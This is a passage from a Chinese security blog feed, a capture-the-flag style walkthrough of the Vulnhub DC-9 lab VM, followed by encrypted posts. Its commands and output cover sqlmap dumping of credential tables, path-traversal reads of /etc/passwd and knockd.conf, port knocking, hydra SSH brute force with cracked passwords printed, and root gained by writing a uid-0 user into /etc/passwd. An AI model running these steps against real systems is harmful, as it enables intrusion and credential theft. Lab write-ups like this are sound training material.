&quot;search=123456&quot; -D users --tables --level=5 </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151510643.png" alt="image-20240415151047575"></p><p>爆字段 </p><pre><code>python3 sqlmap.py -u &#39;http://192.168.204.138/results.php&#39; --data &quot;search=123456&quot; -D users -T UserDetails --columns --level=5 </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151511447.png" alt="image-20240415151157366"></p><p>爆用户名和密码</p><pre><code>python3 sqlmap.py -u &#39;http://192.168.204.138/results.php&#39; --data &quot;search=123456&quot; -D users -T UserDetails -C &quot;password,username&quot; --dump --level=5</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151513568.png" alt="image-20240415151306497"></p><p>得到了普通用户的用户名和密码</p><p>接着来爆Staff数据库 </p><pre><code>python3 sqlmap.py -u &#39;http://192.168.204.138/results.php&#39; --data &quot;search=123456&quot; -D Staff --tables --level=5python3 sqlmap.py -u &#39;http://192.168.204.138/results.php&#39; --data &quot;search=123456&quot; -D Staff -T Users --columns --level=5 python3 sqlmap.py -u &#39;http://192.168.204.138/results.php&#39; --data &quot;search=123456&quot; -D Staff -T Users --dump --level=5</code></pre><p>得到表中的admin用户密码是哈希值 但是sqlmap可以直接进行爆破 得到明文是<code>transorbital1</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151519482.png" alt="image-20240415151903397"></p><h4 id="登陆网站"><a href="#登陆网站" class="headerlink" title="登陆网站"></a>登陆网站</h4><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151520596.png" alt="image-20240415152003554"></p><p>使用上面爆破出来的密码成功登陆  但是看到下面的<code>File does not exist</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151520427.png" alt="image-20240415152026369"></p><h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><p>想到存在文件包含 </p><pre><code>http://192.168.204.138/manage.php?file=../../../../etc/passwd</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151939819.png" alt="image-20240415193910763"></p><p>成功执行 发现其中的很多用户都在我们上面爆出来的数据库中的普通用户中出现过 </p><h3 id="三、ssh远程连接靶机"><a href="#三、ssh远程连接靶机" class="headerlink" title="三、ssh远程连接靶机"></a>三、ssh远程连接靶机</h3><h4 id="敲门服务"><a href="#敲门服务" class="headerlink" title="敲门服务"></a>敲门服务</h4><p>看到很多用户都在那我们应该尝试使用ssh进行连接靶机 但是之前我们在扫描端口的时候发现22端口开放的ssh服务显示的是被过滤的状态 搜一下这个情况</p><p><a href="https://cloud.tencent.com/developer/article/1782065">通过Knockd隐藏SSH，让黑客看不见你的服务器</a></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404152002647.png" alt="image-20240415200255585"></p><p>看到是使用了knockd端口敲门服务 隐藏了ssh服务</p><p><a href="https://www.cnblogs.com/f-carey/p/16066178.html">knockd端口敲门服务</a></p><pre><code>端口敲门服务，即：knockd服务。该服务通过动态的添加iptables规则来隐藏系统开启的服务，使用自定义的一系列序列号来“敲门”，使系统开启需要访问的服务端口，才能对外访问。不使用时，再使用自定义的序列号来“关门”，将端口关闭，不对外监听。进一步提升了服务和系统的安全性。</code></pre><p>为了可以重新开启ssh服务 我们要查看敲门服务的配置文件<code>/etc/knockd.conf</code> </p><pre><code>http://192.168.204.138/manage.php?file=../../../../etc/knockd.conf</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404152006026.png" alt="image-20240415200604990"></p><p>我们可以从配置文件中得到出来敲门暗号的顺序 </p><pre><code>sequence = 7469,8475,9842  # 开启服务顺序sequence = 9842,8475,7469  # 关闭服务顺序</code></pre><p>下面我们就利用敲门暗号来开启被过滤的ssh服务</p><pre><code class="bash">apt install knockd  # 安装knockdsystemctl start knockd # 启动knockd服务knock 192.168.204.138 7469 8475 9842  # 使用暗号进行敲门nmap -A -p- 192.168.204.138  # 扫描靶机端口</code></pre><p>可以看到靶机的ssh服务成功被开启</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404152021880.png" alt="image-20240415202126831"></p><h4 id="hydra爆破用户密码"><a href="#hydra爆破用户密码" class="headerlink" title="hydra爆破用户密码"></a>hydra爆破用户密码</h4><p>将刚刚数据库中的用户名和密码单独放到两个字典文件中 <font color='red'> 这里要注意 用户名和密码字典中每行用户名和密码后面千万不能有空格 否则是爆不出来的 <del>问就是血的教训QAQ</del></font></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404152034860.png" alt="image-20240415203445829"></p><p>使用hydra进行爆破</p><pre><code class="bash">hydra -L username.txt -P passwd.txt ssh://192.168.204.138</code></pre><p>爆破出三组用户 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162108924.png" alt="image-20240416210803862"></p><pre><code>login: chandlerb   password: UrAG0D!login: joeyt   password: Passw0rdlogin: janitor   password: Ilovepeepee</code></pre><p>用这三个用户都登陆一下靶机 发现登陆到janitor靶机的时候 在登陆后的默认文件夹中有个隐藏文件夹 另外两个用户里面没有</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162121760.png" alt="image-20240416212109728"></p><p>进入文件夹 查看里面的文件<code>passwords-found-on-post-it-notes.txt</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162122905.png" alt="image-20240416212217860"></p><p>看起来还是密码 将这几个密码放入刚才的密码字典中 在爆破一下 发现又爆破出一个用户<code>fredf</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162125625.png" alt="image-20240416212534564"></p><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>用这个用户在ssh连接一下 执行<code>sudo -l</code>命令看一下可以使用的sudo权限命令 发现<code>/opt/devstuff/dist/test/test</code> 这个文件可以无密码以sudo权限执行</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162225736.png" alt="image-20240416222540670"></p><p>我们进入文件夹 读取一下这个文件的内容 是一个linux中的可执行程序</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162231229.png" alt="image-20240416223137150"></p><p>尝试运行 发现回显是</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404171446154.png" alt="image-20240416223630531"></p><p>告诉了我们test.py的使用方法  那我们来找一下这个文件</p><pre><code>find / -name &quot;test.py&quot;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162242150.png" alt="image-20240416224204963"></p><p>进行读取</p><pre><code class="python">#!/usr/bin/pythonimport sysif len (sys.argv) != 3 :    print (&quot;Usage: python test.py read append&quot;)    sys.exit (1)else :    f = open(sys.argv[1], &quot;r&quot;)    output = (f.read())    f = open(sys.argv[2], &quot;a&quot;)    f.write(output)    f.close()</code></pre><p>这段代码的意思就是读取参数1中的内容 将这个内容追加到参数2中 同时 运行时的参数不是3的话 就会报错</p><p>那我们就可以在创建一组用户名和密码 将这个内容写入&#x2F;etc&#x2F;passwd文件中 在切换用户 就可以获得root权限</p><p>先用openssl生成一个加盐的密码</p><pre><code>openssl passwd -1 -salt admin admin# $1$admin$1kgWpnZpUx.vTroWPXPIB0</code></pre><p>利用test可执行程序将这个新用户添加到<code>/etc/passwd</code></p><pre><code>echo &#39;admin:$1$admin$1kgWpnZpUx.vTroWPXPIB0:0:0::/root:/bin/bash&#39; &gt; /tmp/passwdsudo /opt/devstuff/dist/test/test  /tmp/passwd /etc/passwd</code></pre><p>在切换用户 已经是roo权限</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162313083.png" alt="image-20240416231342990"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162314972.png" alt="image-20240416231419833"></p><pre><code>███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝                                                                             Congratulations - you have done well to get to this point.Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all thosewho have taken the time to complete the various DC challenges.I also want to send out a big thank you to the various members of @m0tl3ycr3w .They are an inspirational bunch of fellows.Sure, they might smell a bit, but...just kidding.  :-)Sadly, all things must come to an end, and this will be the last everchallenge in the DC series.So long, and thanks for all the fish.</code></pre><p>至此 我们拿到了flag  DC系列靶机也告一段落 </p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.xray扫到sql注入漏洞</p><p>2.sqlmap进行自动化注入 找到网站登陆账密 和普通用户账密</p><p>3.使用普通用户账密 hydra爆破靶机登陆账密 </p><p>4.敲门服务 连接ssh</p><p>4.找到隐藏文件 切换用户</p><p>5.可执行程序 添加root用户提权</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;vulnhub靶场DC-9&quot;&gt;&lt;a href=&quot;#vulnhub靶场DC-9&quot; class=&quot;headerlink&quot; title=&quot;vulnhub靶场DC-9&quot;&gt;&lt;/a&gt;vulnhub靶场DC-9&lt;/h1&gt;&lt;h2 id=&quot;靶场描述&quot;&gt;&lt;a href=&quot;#靶场描述&quot;</summary>
      
    
    
    
    <category term="渗透" scheme="http://w3nx1z1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="打靶" scheme="http://w3nx1z1.github.io/tags/%E6%89%93%E9%9D%B6/"/>
    
  </entry>
  
  <entry>
    <title>2023FIC(除了两个程序分析)</title>
    <link href="http://w3nx1z1.github.io/2024/04/13/2023FIC/"/>
    <id>http://w3nx1z1.github.io/2024/04/13/2023FIC/</id>
    <published>2024-04-13T12:31:22.799Z</published>
    <updated>2024-04-13T12:33:36.638Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="9fb43e0121b98b661ac3613444f8ebabff674ecfa51fb767f22a74957b654905"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码查看喔</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="取证" scheme="http://w3nx1z1.github.io/categories/%E5%8F%96%E8%AF%81/"/>
    
    
  </entry>
  
  <entry>
    <title>2023浙警联合赛</title>
    <link href="http://w3nx1z1.github.io/2024/04/11/2023%E6%B5%99%E8%AD%A6%E8%81%94%E5%90%88%E8%B5%9B/"/>
    <id>http://w3nx1z1.github.io/2024/04/11/2023%E6%B5%99%E8%AD%A6%E8%81%94%E5%90%88%E8%B5%9B/</id>
    <published>2024-04-11T10:15:08.914Z</published>
    <updated>2024-04-11T10:19:40.974Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="f8fa481c3dae392fa2c1d10c51ebd6d8021f2c9b2b29498819c82d7fdef98bd6">1b785cf2658ff90bf27d7487a5703c7766be79956d5b9d48e086a1774570dd7a86003112bcbe362708e7137d932e9e7970ce573a062075956828b5e84c69bbe0bb5404f73d0b26d826dd4278cd8afbc90e96d377a6f40dc9caeca0b80036e2af4027e8483dcd95071a4d419abf96432a8d0ec18dfc66d694954deae96e2e602267f956fb7714dbdc06291074ab13230732163275748cdffddbbd006ad40ddee521b0efe02f79a9a160ff3fcdc015660542d66309d671329b203dc07367ad67327e3b52f1f992fbbfa57bad50e945d64b4bd00fd6bafed83e64a7c2d0e975ec3d68e7142e94866f4db396c9b09cead0bdd8410f95c515630f3a9c435be7f236dd9694a5f5ba9c038df860bd6279c9e73fd928117bc8ac53909baf26c5f41dfc7623d8b60dfc6811d349a310ce52848fd182d32b501de8b2ff7f299bb33c1a66ccf4364cd6c6f1db1097a7ffe3463d6099c5a56d42627eb389f72caf13c2930cbaec90907d4c13b98ba8114e5e5cbec72ebc8a4114c582934d8e62a6502f49ce2bd0cd85f22fa8d46678b82bc4ec00950096d4bac69d274c9bf313bc726407af32796247b632f42fab8a48e83519913b3512709142214d07ff56f3b21dbdbeac00305b6553c987add8124789811ce8f0b2befd796141c91e3b6c4c394a7ab45a2957af987ae6c303ec3ca0163efb2988e16d8bb5e339baa1e9193056a0fe9e6000744984a1ecd39cdd0a313da3775fe8bc92820260957d3b1f6f63fabea1d3ce0aecd692550b16806e0d0af9eb956b25c4c36411ead218a37f342287ab7ddae45c5fe38e27849f9f3112a38c571ca0cbaa0b5bea770d491717b17ab3159bf2905797512700ef2fe27ae30b1e0b8d5a3168a87bbfd5bd669844e44eaed0bf3fe40e69418102b1fbc9353cd50678e78f75e75145837d6335b26c047b0de98edebc744b258d44412d36a73e45d148a0118555655f75c6fbf63cfbb6494f9273f1fea65c58c5354b92f1c4a36feff6670a66066ea084db33e415eab159053b7f1add5ef5a7fd6326b39771e2334f85d999b69ea07912f97411dcf383833773ae0e744075147f3d712004297647d042ed8a2a7cb5763c457aa67b30b052a3c6b2a89ebd64582a3c73bde6170a68cb33e8e8b427945d8f6c341705557ea60c8e62c1118076cbbb2a873ca96b014541ef76595e8460483e4502cbb96322f72fd7f3bfe456bf0832b8c1ec69141914e19dced7b5294d30016f55c2311e6ea4a1ed4e1d180c7bdac1e4d3a1c8cb85eacccdaaf8643f4787ded0bda6a2334d4dd7d1fab519c3ca6095e2a68b856133a903a949a6b01aa8779d77103eb002a21a28106899dfd8735cc2112e7b5b702cd68d5170058a92a1c31bd884021fd5e393e6e86108a792a64fa1973fdaf53912d75fac09f4273920a089db04a74fa34e28db1ddde46fc059201286b842b0bad5bed30ff6d5f3da79604776d24c1a187522d1cb389536e2b31f19e695c66b83b12780e451fc6010e895bd22c4ef1d73f48adbd8218551bb5637756ed1e2e0554f9f974c2abde58adb12d25dbeb549efdf0b19cab83daf0b8202e63670ecf70e4a7383ce0f8ed46f9d4e2b3650ca2fda5766289f09f15f59bdbc1b5435ac22f2e4c9ac5724260fa57cedda683f2779e37bfe02d9de7950d7dc6f19edffdf08d908d01bc88c1bf1b93616c0b9a35dbe150fde0de2b3f5060b0917be5d6c7c71e57811cd7fb18cf3736d4dcc24334964fd95995f8fb6a2908ca09d017e1ef843dfcfae83b3805c8a6dadbacbbadb1ecf451cac02fb1f5fd1beb3f395fab156fdfa1a9752fb65ba52dd76da6545fa1d4c46bb92d88d91c149fcf2b202707ab86917439f404bdaae28b3a8a2b544670e4ede1411343cc71d2d8c5d2530d516abeb36372305b7e10718ebf746f75aeb59eb97f3b5cc5d54b8cbcea153262e0e55cc5d56b13297b1472bda261c46bbb8985888a1013376d405184381a1e5ab36d26e65de005b1efb6571fe85cacb7ef92b7e338d4fc1603f67bf30495bc066c792431fee11e15c5ee6014eca6e26e60f735a84f76c59f87d072201d2ad29d4a8039f142b1dce86c93b0a353dbf228e2e0c893008f6f11f64df1c8e95d02d3c38ccd5b8fbab20eac1ffb8a05b3df5ba426f4cb817fd009055f5b4955b4bcd7e849fa2ce902041ffc5f3c313c14e5303f08f40bd8375c7a17357b2d7efebb0abf2daeaffa43d9ada02163ae5c45fa18fd467f15aff5ba772c5b8c5ccfef03fc64183cced9228509dc255163ec3ff67db8b5d960b9a7ff46749664ba479a6b3a63f6540e2379f354d0b70bd4f990efe165aa9b883ad9ab87e0659343d912d7409d960d70e3eb50f719bc3b842b0bfd0922ae0bfd3b0991092e528b237a7a715f816ca7c3914bf2648691bb0b37f5347a3e4d72e26dea13627c22c14c0b8ac804567536f778cd399d07051b5c0524d16f0098abc293a04038b9c395bc4f0c40a76c3868b5547fe8b27057d31f47223a584f2b982b90fd2f0b8d975f612bb7c41f0a0b3dbbdc1bba2fda6e7291d561fd62dce54011374305d4883dace5ad9d4e970060bf4e5635db2fdd38805e02c0d4961ab0798ba22ea91ad44aa9efc6bb1141872adf8fc0f717b3fa1ddb5de5f5d304b10c5d8d087e5a7b449b22ca5499e1f3e49f062494434d7fe638678590fed2f97fc17ff23a0e0b729250938fda4c2d621e77d7dee8c98e88f69fe29ba2e74b3e8d5a828868e3b2ab84e2dd927acfdc4b7fe99b735568e326f28f78c657a1fa99ef5e8c077652fbf5201ce6f8357acaaf1974cd678ab03426686a08ecfb9159e5ac8aaafc0780b7307ec74c16a52ebb977875e8ed6241269519ccc0dba0aff38848a21a6d6728893bc2ff57585f3d4e40b7a3cd1270c403f6b18123dcea4d6befff2fd57fe97ed2601e3e0aef0e2b3332515f1f6b0a4886dd4e8f1cbea6e1cdde2650bfcbd3526b29a45cc32207dfb0ec4c49d52d1e1a8f722e9af71e101125de8d8cf06ac1c0cc1cffbeda355c8500fe4e88e8cf42b7bdec0505f03292ba9f4abc4277651b7c2053f0cbe8b149b0eb260e399797f816cb83fd9f4b96710a1c4ba6ec8746c79b7491bbcdadb57eb5a5b3dec1c463b26fd7da34f1511b7e6adf65c1c096df85f0fd9a1a9bf0b5553546f958d6af3e1b2a8041bdfa0caac6a7c406589e0ef19b15ce74fbe793474faed73652d2d49d0eebc07ca60d859bd8cd259b63721cc6ac0c5d0bb13aa543cedb8b1dd11f03be969dc6952dd993c739d59f8af996c58376911007e36bfdeceef7316f4456c190ebde2e836dbd7f93081dfc14f0494f4fc18adef2a621107b6e05d8dfaeb8771edeb9328bf122256e96760b7cae1740f53998f22e1dc6e6782a3b8362cbc819a630cbc9a72ac632349a711c56831fe5d2ccef46af2017135170251c720d8efa7b3f978384414878ee431be23d316d6cb86f3e79358270b527ffb0943b72eb848f54a12f4386fc60d5972d5b371a100a578640250e345d66df84107ca4293a12ae9f0852ad38b941e05412a338c834baed5a3aa4563f0a600714d3309afc8887999e8c9bd1ecf627753fa56d9a74fa792d2d79c3ab3df5e1c15cfbff108c717c4e6cf392f05a5a0dbf832637215461729da57a42bc20307459f33dfaa4f21b5cd8afa0b7ec901f0aea0b90265302000e396485a18bc81b5c55436bb112153959ceacb5b617d8f90e26b0c6d7a84cec44ac7a0b6f7a3e4b61c0dbb04d77768df3d227b0c7b54f7276f0d11696225f98b473bada292cd9494c9e1ab4ac2c36f517108d2d7a0dacfe24c1611c9d30f67e16d76841a08e5b34fb5236fbe9d7d10d3ad74552071dfac3317242de9c07d00ecc08bd5253c9fbcd8c3db0fddac4da183d734b825a3a4138161ff2cd80a06957af3ebeb89ff4966db3d76eed412a09b4b1e57b3dc7bcdfce02f55ab24c08969f65affd76d42a04dd181ea5ec043ec3306307fc2453bc51f9de3d67d096f330e78641b3ba63b4a20da7fceca80cd72bf13e0969ebc56832af394cbf3499092d084a2ccc7e7bd3260e67b9a76f55cc25a6240224cd56b8727057bdeab569886526335816927a921a24a702ede01d04aa76548f6781275808d5974b178c8d2f858e2de37856af924f06ac69174f97165459e3e181d9b7ab34cca0e8ae329a1649b2bbaf550f95a80450cf76b340ecddf2502a234e5824fa3965dda16aff021f919a81dc3c7018b6ec2c54325344fb9c54c255a7fb6ad353e808719b8e5787f75133479fadb6370a50c72c6a7af51f1b2e62ef3f562b2dcf41df024b90da34c12a6396250815f3ea0d28c3e614b4876f01e869a5bc26d1ffd99b99b69338ead986bac3c80025116df4e41b318d56af8f015908794ccc16e9c819704594cdbb45a48b671d153fde92b9c79b2f47ef76363760622807859ec5fde315f6dff0c4ffcde5ba834b19732a45c02669eaaee9577771bccc89430d0d5b97d9d697b06f6444e069a333acf53ae9c0a59ab383634dfc596783e55629617549399244614dda2a6f1dadad2261da6bd3550549c4ead29aa79fa1282adfc3507b75063f0e644bff36c2d3b99db1e9cbc11c087e3402a6c459e9eb97afc7c191f9963f869c08dfa059c0a82b39fbd21dc6b7eb1a6f7f55dd3b1cc3821da105caf7c6decdbe590aa932f073be7c210dec587b74eea576014fecae13d162b934d15b89030a64d0548e4229be7009bfba0449e0c020f29512dada73e40f7dbee6eb04c7bb9601fac0eef9f2b23b933c93990061be07f7fdd4a044da9dff579aef1f9db36cef8c8414424bf9d3de0a9d0028815e8dfd94ebc7914653512f37025bab0867cb8487fa0325c9470741a396a77eade751806879be75a43d5aeacdc05bb8406bccaeb95a9aa06bb5c71609ac35005980a1a050035fabe2b1615ec140664d09512d06b87986aa9471985919146c3279a95a8aa832d417e9af9d128bab51feb2fd8e39da01be165ed5370d464c2a528b867c04cb8fd73eb63882f53f042f124d44e927c18a8b23840fae71c4f64362f9916353d891baeaed55193ab352c1684d98d7066aeef8fb9f3f19aed3989e1dba7e8c7c886675ff3b4fc501502ce805c4692fbb38e66ae23de23cad51a1ca3a3a3fa58497a92ac9ae0cbca9eb86665c450a9466dac3ce3344cc8e4b3332542c2633fafc1432f41d5f788fbae8d2f1d875b326dcdd521974d22278cb67b105dbc232a193a5a0b91aa893790644dda65f3d6c4bfe687d81003b976cb38bb461bac9be1232c743f39c2b01f33345ee2548ba80eac6181f12447d7ce09e46ea10970ffaf5b65b36b20213bdc80d55435246855c362c1924208c7520998a16803e8883894835896baf94d30bd9da4c0a21a50a9219ab27a69e16b13463c21430d672ae1a97c0ff45519500a480ee710beb915700c74110b5e52d211061c6b401be09b9556c8102d68ecd6f89b6bd36bacdaeb557505184c0b899163e5555e1f9dc748ad45e392f024252296926de557f018625c50a41e3bef4afa239d0561dc0ebe7ea9dc59e72d1d420db3c546edb8515d831f6ee644f3391729c92d1a9400c22bc56cd6baa0a8d989332e7ba896038174f6b2c2eea006a20a11c44d5d9e4c6a30629fb5792208c5b21cc0e0908603a3a57ac2a66ac3b18684db9fd4990a749659a43cc5c44862928cd23d0fef39f7a14c3e6a7b6bc012cbadcebb0217aa7a418a996a539b4242a3b016e27074fec0110e963a3889de24b12caf1edb21899f7ca28af742f9b2a278fdd2d47c21f06e9aace2b90b86bf41bc7f5cf178d16bb1adbc015baf4d0ff66850277579748eb7ad240fcfdfafb61b57123999f0494ab3f26683c1c91e6fa79282695c7b243d6424fd0ceec98b1a72e248266fb64101fc946bacfc1098a02dae770e3599312885795b7dc0f49065894a2c31fb752c55afcdd3ac062910d3fdcb7535e127ab6719fe3b4a057eb03121262b04d63678cbf9d564b7e78c9d8603c5829c5cc78fda2e77f543f235d24ae59428f9cca7f09cd775834ecc02a3a69dba561cf43813a6c86df3f62d6920214765ad76e9ff3bc7e9272221af54c1a84c10b96e9076e9cb23e54f96a44766088c052413840c2ec5a6a46681dfe3e0f22489e59aa8a1c09808ca5a3f565d1a5459026cf73dda20eae3e419c1810699bedafa7aebc0f70a6dc41b8f6c204e8342509950a8ddb12327aa1258fdfa33e6e1b0921f45594086e0a4c96bb3c71aa608f408a6e43ab0c512d797c20dcff9e4ecb78c97ed72490fcac585bc42caa44be0eaf6307d613675174c941e4e7a88890a3640bfac2cedfa58cbaad4e51adca0e3d821fae20ddabed6ae60787b958afd68cf8204db6630b0ceb23b8c6b1b4ee95bd2d7cf9f5934186dfb0fc9d267175b11dfb9a114ba31f86cf064ca2429250095644323601469177189102ee8219cdc808aa81e2f9a58d712990e304ebe5a0c822e98579856d581c8a32f09efa42bdb595d3a0c0f67015d72086dd6c3d5c546da2558d5ffbaad60be1495f70de6757cea884b4bd585424bd2883371596e1da8a1598273c76a6ae80f768904ed844f0c4ad6c354f04cca9f85ea49482a0fd748b168052093fc739f7643de79e1b281c201d52aab2c625859c997e9f7bdd1fbd66d894af09c7f5cc17fa4c657231d3cb307e829c392a59a968c52aea74a7594fc0f91007527b8a688eeffc6d589c6e1d672124d6fe2ac3cde305305a01c2dab42ec42fee60929dda0277626d7a84b1353a0b5e697cafc03071656fcea5b8fe950758d110670f72e1d8635665651ce3719a9ec144428516ff2ea8093dadf4fe38e233e3d2cb02547442764e70b01f2b5dface747560d7585020c937e79de648c4275d4284aeb16d97c82038e9157580c21ef19e83956208c08a9fe3c2c32fe4fbd496dfb95ef697079e93c1e00a1d6e2a7362553158f9b07ed57a3f8c031d5067a11e8cc856ecf0ce84fc828c79838bbc29798cce0e2b57f9e3e5d2689883354eee7661f534dba7e54c8f3d413bef4837f1f73d7c6dedb9bfd5c51a427147536abd329984d4959a123e518f609b42e3a1d3aa2e36189a7e966c17393754bfc665434ac99f8da3f06d26363df152f0c57083cfe93a398b522ab9555bd21b8dd40379fb2c87d76a43afca041e67bc4a4507cb409d59e5e5057b499e04b4ebd4ebb028b0921f00f3fbed1858c71b30886f42b16d852b797bfeff1d9096111dd4c1f6bf3a360cef0bba244a457860b8e23d9521deb81222ecb39df6d20c183571bb31d4ddc9684ff32f595a9d3ad125aa68dec7253501ddc6f8fae30ae02234deb58a27614d1a479d70d3dc5acfab305c427b04a1c45fcbec1ad58158e0b99ccef284e99680a1ba3b7ea0dec403066a42b3985af263ecee0b65c0bea836ddbca4b4b845a78d1245360bf695ab9add5d008c340da6b3111e76028f1b14ace8389e9f083fa4d42c72cdb1b1eb4174d7be9f17323c2bc53441f2358b64c697959baf3389c6f50a2f19ca39ae94b3484a57a169e146365bf038bfc1b32c212736a70aa3086e977b95604ef4b862fe3c2224ab5c07262fdc7db09eb38c8405820369f6a45309ee0a7b53ca93f7f4fec95f9bdc553e12a29a1133a16a0d9c16eb1ae8c995e9982120f9151eb6c874141404d488aaed7d86b504f9d561d76eb766cdb9ead3bd54e3541ae78c6734855ded478619fde41d7c8ada25c84d7bee068b6a780ee5711d2a6ac121235b1f6072a77112e6cd0fa7cd1700290165d4d17698a00edc7ad67d4f4cadf1786334fb00cb9b34057d82c7e558d6258f530f3c9439af8ad6f547222e7fe2c28664479a9f83787c676889868ca6dea1fdd33b15a888462232e001b6281845c14a54ee0dce5f4149dc70f7abe9bb1da5a2d04ac59b438a27acc37d4a483df2505733708ef53cfe89e38eedea49a0811d8257bd677efb5063d22fa6d0999c2596924e6180c88a89578098bd930f17d52054593c2374a7b2523a0dede1901105f54815bd995dffde59c001b520da916639dfe65de0c244cd4958a33580908ac8ad3e7bc29e034f60b625cce2d5016d6ab14d37ca08529baf992f4055f49f622c350e1f17df4d97651f09064ca4d803f1179f8694311545ef38bc978170a81254a78f1edf4447fd3edbaadcfecda4d5a5f1f67542b6fc977d9a4e8aed5aabfc476af56f306097415b0e29276dee9da59c2db0af28f1d3135af63885014349f216c00cccd17596ca0add590147fcdee698814a0db4a7f1fe38e9299a2ddc3dc7b8f5cc37c82612828af93a76dec05a4eaf0428a093cc30179ef5eaa01f78be4938946b27082ad46a65d86cf620964c406f6d4892f47c2213d4d95c159416456d2c93c230c76b315020ba243055b1e2f27cf2d1055e1c950e6765f50dee39dcde7916184702323e073f6ef2135987f034a1facebf1127ca3d93591977715366d6022910bac7b4b4bfcb4eb2d562b4a41ff8b6a24a8b5bbd1fc41a42207b1400316ba51e5e4835684fe2070871b494038841cbdfe20d16b4eaca0699453f377d1876492cb44ba36444c13529050e50bb5d14c967ef0231984eeee8746547c728584cccac66e40a0305b5c67c9e268cf9df9bb9c562bca2722447d788ee3499c7af4e1eb3d6cb4afba367a24b38587b4ec713f253e4827f1be091a116abc4e908110dfb308ed9fb35e1af582c3102932c60e50c6e52f2d16d56aa085c97dc89ce53f33bac1148a85a5d518379542abd9a3c6dd2914fa84b7e50ecebd24597645c4c12d2ef094854cf50f91331762de0369e135355a914f30fc52bc9dd5f9c7868dfa2966e20b71b22a87108589d6620502b616fe41c76cd0d001358c3758f69790eb1c9660aa863101aa6b67d71d6c39fc78ac1940a697cd6f2002c8e7037b1f4ad247c17f94185656e2d168be44d1706b5adcf97df86c56d47dcf503f932518fcec58abd89443e66ba184071078381c1dfdd021014ea04bd09388d2a457ff74596d1f86190014dfa77d30b4d1e7b70266fb5aebeb6004f92f15d66cbaf2becf58b8c8b08bc8cc98b5bcdf6dce19f2ffb3c48e1d0df8c79e7761a727cd354bd5198c98b5d6340e268a6b9bb5881da8bec584008186d9f97a4e66a4fab7fdaaa5afc12b720555a571b164a85f2bb6b7d77027f6fed542affccd7a6f3e8521b787f6781c603c1bd5beb1688afbebc1054692145da2947683ce875ce85e2d125b1431e9c206a2f36fdced622327b00bb93e6bb64a84d13fc46ee8e8996896b4fa045ac6d5a3899bef3d1e13cc8a898b68621dc0620bfac94596fb0bb883d5121e2558b6d1d937e246c10157a2eb30c7bf7b713d9588b2f40bfc3ec333a3ee3164fbd9a6d1221b35e7cdd2e7a39a12963e8e732b879a6a04c1cec4dd97078049e89684a21eb45cb7a4f5bfd2e569336ae0dba5ad4f285c9dde2529346e84fac61d1a33fb79351e37f6cf5edcaf5d18899c26fe958567921ad86d8056299014b02956dfa69a58e3d254afe4e869d993b729cfbd6568add00c60204fdcc775276ee5f817cd69746607c181cefd3a0df16f251a72ce21efb2eebe